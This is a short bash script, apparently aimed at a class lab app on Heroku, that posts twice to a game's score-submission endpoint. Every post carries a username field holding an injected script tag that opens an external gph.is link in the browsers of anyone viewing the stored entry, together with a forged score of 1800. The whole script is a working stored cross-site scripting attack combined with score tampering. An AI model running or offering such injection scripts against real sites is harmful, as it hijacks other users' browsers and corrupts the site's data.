#!/bin/bash

for ((i=1; i<=2; i++))
	do
		echo "HI"
		curl --data "username=<script>window.open('http://gph.is/2d4jD6G')</script>&score=1800&grid={}" https://lab8-11-7-18.herokuapp.com/submit
	done
echo "done"

